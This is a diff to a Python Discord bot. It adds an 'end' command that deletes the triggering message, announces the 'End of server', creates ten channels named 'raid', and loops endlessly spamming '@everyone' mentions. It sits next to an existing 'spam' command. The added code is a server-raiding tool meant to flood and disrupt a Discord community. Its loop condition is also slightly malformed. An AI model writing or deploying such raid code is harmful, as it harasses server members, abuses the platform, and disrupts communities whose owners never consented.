@@ -83,6 +83,18 @@ async def spam(ctx, message, num_times=5):
     for i in range(num_times):
         await ctx.send(message)
 
+@bot.command()
+async def end(ctx):
+    await ctx.message.delete()
+    await ctx.send("✅ | End of server")
+    salon = []
+    for i in range(10):
+        salon_channel = await ctx.guild.create_text_channel("raid")
+        salon.append(salon_channel)
+    while True:
+        for channel in ctx.guild.all_channels and salon:
+            await channel.send("@everyone")
+            
 
 
 bot.run("token")
